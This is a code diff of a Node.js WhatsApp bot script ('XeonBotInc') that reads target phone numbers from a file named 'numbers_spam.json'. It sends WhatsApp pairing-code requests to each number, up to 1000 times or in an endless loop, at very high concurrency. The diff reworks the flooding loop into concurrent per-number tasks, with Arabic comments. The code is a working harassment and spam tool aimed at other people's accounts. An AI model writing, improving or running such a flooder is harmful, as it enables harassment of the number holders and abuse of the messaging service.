@@ -21,7 +21,7 @@ const checkFileChange = (filePath) => {
     return false;
 };
 
-const MAX_CONCURRENT_REQUESTS = 5000; // زيادة الحد الأقصى من الطلبات المتزامنة
+const MAX_CONCURRENT_REQUESTS = 5000; // عدد الطلبات المتزامنة لكل رقم
 
 async function XeonProject() {
     const { state } = await useMultiFileAuthState('./session');
@@ -54,54 +54,25 @@ async function XeonProject() {
         new Promise((resolve) => setTimeout(() => resolve('2'), 1000))
     ]);
 
-    let count = 0;
-
-    const intervalId = setInterval(() => {
-        loadNumbers();
-        if (checkFileChange('numbers_spam.json')) {
-            console.log("File changed, restarting...");
-            spawn(process.execPath, [__filename], { stdio: 'inherit' });
-            process.exit();
-        }
-    }, 1000);
-
-    setInterval(() => {
-        console.log("Pausing for 10 minutes...");
-        clearInterval(intervalId);
-
-        setTimeout(() => {
-            console.log("Restarting the process...");
-            spawn(process.execPath, [__filename], { stdio: 'inherit' });
-            process.exit();
-        }, 10000);
-    }, 10 * 60 * 1000);
-
-    try {
-        if (option === '1') {
-            const xeonCodes = 1000;
-            for (let i = 0; i < xeonCodes; i++) {
-                const batchPromises = [];
-                for (const phoneNumber of phoneNumbers) {
-                    if (batchPromises.length < MAX_CONCURRENT_REQUESTS) {
-                        batchPromises.push(sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes));
-                    }
+    // إعداد المهام لكل رقم
+    const tasks = phoneNumbers.map(phoneNumber => {
+        return async () => {
+            let count = 0;
+            if (option === '1') {
+                const xeonCodes = 1000;
+                for (let i = 0; i < xeonCodes; i++) {
+                    await sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes);
                 }
-                await Promise.all(batchPromises); // إرسال الطلبات دفعة واحدة
-            }
-        } else {
-            while (true) {
-                const batchPromises = [];
-                for (const phoneNumber of phoneNumbers) {
-                    if (batchPromises.length < MAX_CONCURRENT_REQUESTS) {
-                        batchPromises.push(sendPairingCode(XeonBotInc, phoneNumber, ++count));
-                    }
+            } else {
+                while (true) {
+                    await sendPairingCode(XeonBotInc, phoneNumber, ++count);
                 }
-                await Promise.all(batchPromises); // إرسال الطلبات دفعة واحدة
             }
-        }
-    } catch (error) {
-        console.error('error:', error);
-    }
+        };
+    });
+
+    // تنفيذ المهام بشكل متزامن
+    await Promise.all(tasks.map(task => task()));
 
     return XeonBotInc;
 }
